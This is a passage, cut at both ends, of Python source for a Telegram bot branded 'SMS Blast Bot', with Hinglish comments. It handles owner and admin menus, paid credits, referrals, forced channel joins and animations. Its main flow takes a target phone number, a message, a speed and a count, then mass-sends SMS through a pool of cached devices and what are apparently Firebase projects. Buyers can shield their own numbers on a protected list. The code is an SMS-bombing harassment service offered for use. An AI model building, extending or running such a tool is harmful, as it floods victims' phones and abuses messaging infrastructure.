        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥"),
            btn("rᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])
    
    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘrᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("aᴅᴅ suᴘᴇr aᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍaɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("rᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("aᴅᴅ aᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("rᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙaᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛaʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘrᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙaᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛaʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛaʟ ғaɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ usaɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғaɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

async def _boot_animation(boot_msg, done_flag: list, edit_lock, ready_event: asyncio.Event):
    """SMOOTH TYPING boot: ⏳ → 'ᴏᴀᴅɴɢ' char-by-char (cursor ke saath) → dots →
    phir brand frame (🥷 ◤rᴏɪᴅ◢) word-by-word → ⚙️. Final panel aate hi band (done_flag)."""
    if boot_msg is None:
        ready_event.set()
        return
    words = " ".join(BOOT_WORDS)
    word = BOOT_TYPE_WORD
    cur = BOOT_CURSOR
    stages = []
    for n in range(1, len(word) + 1):
        stages.append(("⏳ " + word[:n] + cur, 0.07))
    for d in (1, 2, 3):
        stages.append(("⏳ " + word + " " + "." * d + cur, 0.25 if d == 1 else 0.35))
    stages.append((BOOT_BRAND, 0.5))
    stages.append(("🥷 ◤" + words + "◢", 0.5))
    stages.append(("🥷 ◤" + words + "◢ ⚙️", 0.45))
    for text, delay in stages:
        await asyncio.sleep(delay)
        async with edit_lock:
            if done_flag[0]:
                ready_event.set()
                return
            try:
                await boot_msg.edit_text(text)
            except Exception:
                ready_event.set()
                return
    ready_event.set()

async def _boot_edit_or_send(msg, boot_msg, done_flag: list, edit_lock, ready_event: asyncio.Event, text: str, reply_markup=None):
    """Final panel: pehle typing animation khatam hone ka thoda intezaar (sequence clean:
    'system starting' → phir panel), phir boot message ko EDIT karo.
    Edit fail/absent ho toh naya message bhej do (koi response missing na ho)."""
    if boot_msg is not None and not done_flag[0]:
        try:
            await asyncio.wait_for(ready_event.wait(), timeout=2.5)
        except Exception:
            pass
    if boot_msg is not None:
        async with edit_lock:
            done_flag[0] = True
            try:
                await boot_msg.edit_text(text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
                return
            except Exception:
                pass
    try:
        await msg.bot.send_message(msg.chat.id, text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        pass

async def _animate_panel(panel_msg, done_flag: list, edit_lock, text: str, reply_markup=None, sent_lines: int = 0) -> bool:
    """PANEL ANIMATED open (FAST + stylish): text reveal 3-lines/edit (cursor ke saath),
    phir buttons row-by-row — 70ms steps (user bore na ho).
    panel_msg nahi / edit fail → False (caller simple edit se fallback karega)."""
    if panel_msg is None:
        return False
    lines = text.split("\n")
    rows = list(reply_markup.inline_keyboard) if reply_markup is not None else []
    i = max(sent_lines, 3)
    # Phase 1: text reveal (fast, typing cursor)
    while i < len(lines):
        i = min(i + 3, len(lines))
        chunk = "\n".join(lines[:i])
        if i < len(lines):
            chunk += " " + BOOT_CURSOR
        await asyncio.sleep(0.07)
        async with edit_lock:
            if done_flag[0]:
                return True
            try:
                await panel_msg.edit_text(chunk, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                return False
    # Phase 2: buttons row-by-row (fast)
    for r in range(1, len(rows) + 1):
        await asyncio.sleep(0.07)
        async with edit_lock:
            if done_flag[0]:
                return True
            try:
                await panel_msg.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows[:r]), parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                return False
    return True


@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    args = (msg.text or "").split()
    code = args[1] if len(args) > 1 else ""
    await _welcome(msg, state, ref_code=code)

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await _welcome(msg, state)

async def _welcome(msg: Message, state: FSMContext, ref_code: str = ""):
    """SHARED welcome flow — /start, deep-link, aur catch-all (koi bhi message) sab yahan se:
    instant boot msg → 'loading...' dots → droid → system (word swap) → ⚙️ → video → animated panel."""
    await state.clear()
    uid = msg.from_user.id
    # OWNER/ADMIN: koi animation nahi (butterfly / word-swap / video sab skip) — fast direct panel
    try:
        _early_d = load()
        _is_special = is_owner(uid, _early_d) or is_admin(uid, _early_d)
    except Exception:
        _is_special = False
    if not _is_special:
        asyncio.create_task(send_butterfly_effect_private(msg.bot, msg.chat.id))
    # INSTANT boot message — DB work se pehle bhejo (bot turant zinda lage; final panel isi message mein edit hoga)
    try:
        boot_msg = await msg.answer(START_LOADING_TEXT)
    except Exception:
        boot_msg = None
    # word-by-word animation: loading dots → phir brand words ek-ek karke (sirf regular users)
    boot_done = [False]
    boot_lock = asyncio.Lock()
    boot_ready = asyncio.Event()
    if boot_msg is not None and not _is_special:
        asyncio.create_task(_boot_animation(boot_msg, boot_done, boot_lock, boot_ready))
    else:
        if boot_msg is not None:
            try:
                await boot_msg.edit_text(BOOT_BRAND)  # final frame direct — no animation
            except Exception:
                pass
        boot_ready.set()

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    if ref_code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        if d.get("force_join", {}).get("enabled", False):
            # PROTECTED REFERRAL - force-join join ke bina code accept NAHI hota.
            # Code pending store karo; join hote hi (fj_check / next /start) auto-apply.
            d["users"][str(uid)]["pending_ref"] = ref_code
        else:
            success, msg_text, referrer = process_referral(uid, ref_code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await notify_referral_success(msg.bot, referrer, ref_name, d['settings']['ref_credits'])
                except: pass

    save(d)  # Always save after start to persist new user data

    async def _media_then_panel(text: str, panel_kb=None, is_special: bool = False):
        """Sequence (advanced feel): boot animation khatam → final frame thoda dikhao →
        boot msg DELETE → phir VIDEO → phir PANEL (naya message, animated reveal).
        Chat ka aakhri state: sirf video + panel (video upar).
        OWNER/ADMIN (is_special): koi animation/video nahi — boot msg direct panel ban jata hai."""
        if is_special:
            try:
                if boot_msg is not None:
                    await boot_msg.edit_text(text, reply_markup=panel_kb, parse_mode="HTML", disable_web_page_preview=True)
                    return
            except Exception:
                pass
            try:
                await msg.bot.send_message(msg.chat.id, text, reply_markup=panel_kb, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                pass
            return
        try:
            await asyncio.wait_for(boot_ready.wait(), timeout=3)
        except Exception:
            pass
        # Final frame (🥷 ◤...◢ ⚙️) ko thoda dikhao, phir boot msg DELETE
        await asyncio.sleep(0.35)
        if boot_msg is not None:
            try:
                await boot_msg.delete()
            except Exception:
                pass
        # Ab VIDEO (boot delete ke BAAD)
        await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} {rand_premium_emoji()} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}\nManager: {SUPER_ADMIN_NAME}")
        # Ab PANEL (naya message — pehle 3 lines, phir animated reveal)
        first_chunk = "\n".join(text.split("\n")[:3])
        try:
            panel_msg = await msg.bot.send_message(msg.chat.id, first_chunk, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            panel_msg = None
        if panel_msg is None:
            # fallback: panel simple NAYA message bhejo (boot msg toh delete ho chuka)
            try:
                await msg.bot.send_message(msg.chat.id, text, reply_markup=panel_kb, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                pass
            return
        ok = await _animate_panel(panel_msg, boot_done, boot_lock, text, panel_kb, sent_lines=3)
        if not ok:
            try:
                await panel_msg.edit_text(text, reply_markup=panel_kb, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                pass

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        _fj_note = ""
        if d["users"].get(str(uid), {}).get("pending_ref"):
            _fj_note = f"\n\n{em(EMOJI_GIFT, '🎁')} <b>Aapka referral code saved hai!</b>\nChannels join karte hi auto-apply ho jayega."
        await _boot_edit_or_send(msg, boot_msg, boot_done, boot_lock, boot_ready, force_join_text(missing) + _fj_note, force_join_kb(missing))
        return

    # PROTECTED REFERRAL - join verify ho chuka, pending code ab apply karo
    if d["users"].get(str(uid), {}).get("pending_ref"):
        _w_referrer = apply_pending_referral(uid, d)
        if _w_referrer:
            try:
                _w_refname = d["users"].get(str(uid), {}).get("name", "Someone")
                await notify_referral_success(msg.bot, _w_referrer, _w_refname, d['settings']['ref_credits'], "force-join join ke baad")
            except: pass

    if is_owner(uid, d):
        await _media_then_panel(owner_panel_text(d), owner_kb(d), is_special=True)
        return
    if is_admin(uid, d):
        await _media_then_panel(admin_panel_text(d), admin_kb(d), is_special=True)
        return
    if is_banned(uid, d):
        await _boot_edit_or_send(msg, boot_msg, boot_done, boot_lock, boot_ready, f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.")
        return
    if not can_use(uid, d):
        await _boot_edit_or_send(msg, boot_msg, boot_done, boot_lock, boot_ready, f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Sahilxalone.t.me ")
        return

    await _media_then_panel(user_home_text(uid, d), user_kb())

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_answer(cq, "❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return

    await safe_answer(cq, "✅ Verified!", show_alert=True)
    # PROTECTED REFERRAL - pending code ab apply karo
    if d["users"].get(str(uid), {}).get("pending_ref"):
        _fj_ref = apply_pending_referral(uid, d)
        if _fj_ref:
            try:
                _fj_name = d["users"].get(str(uid), {}).get("name", "Someone")
                await notify_referral_success(cq.bot, _fj_ref, _fj_name, d['settings']['ref_credits'], "force-join join ke baad")
            except: pass
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_answer(cq, "⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number, F.text)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    _nn_user = norm_number(number)
    if _nn_user and _nn_user in PROTECTED_NUMBERS:
        # ALLOW: sirf Owner ya khud ka number protect karne wala (protector)
        _prot_uid = PROTECTED_NUMBERS[_nn_user]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != _prot_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner ya khud is number ko protect karne wala ispe SMS bhej sakta hai.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message, F.text)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, "user")
        return
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        _u_act, _u_days = unlimited_info(uid, d)
        if _u_act:
            _u_left = f" — {sc('permanent (sab)')}" if _u_days is None else f" — {_u_days} {sc('days left')}"
            credit_info = f"\n{em(EMOJI_CHECK, '🔓')} <b>Unlimited access</b>{_u_left} (koi credit nahi lagega)\n"
        else:
            user_credits = get_user_credits(uid, d)
            credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count, F.text)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d) and not has_unlimited(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('home')}", "user:home")]),
            parse_mode="HTML"
        )
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data.in_({"user:check_devices", "owner:check_devices", "admin:check_devices"}))
async def check_devices_callback(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = cq.data.split(":", 1)[0]
    if prefix == "owner" and not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if prefix == "admin" and not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    devices = get_cached_devices()
    if devices:
        await safe_answer(cq, f"🟢 {len(devices)} devices online!")
        try:
            await cq.message.edit_text(
                f"{em(EMOJI_CHECK, '🟢')} <b>{len(devices)} devices abhi online hain!</b>\n\n"
                f"Ab <b>send sms</b> se flow start karo — sab ready hai.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"{sc('home')}", callback_data=f"{prefix}:home")]
                ]),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass
    else:
        await safe_answer(cq, "😴 Abhi bhi koi device nahi — 2 min baad dobara dabao")

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number, F.text)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message, F.text)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, cq.data.split(":", 1)[0])
        return
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count, F.text)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number, F.text)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    _nn_admin = norm_number(number)
    if _nn_admin and _nn_admin in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[_nn_admin]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message, F.text)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        await _notify_scan_running(cq, cq.data.split(":", 1)[0])
        return
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
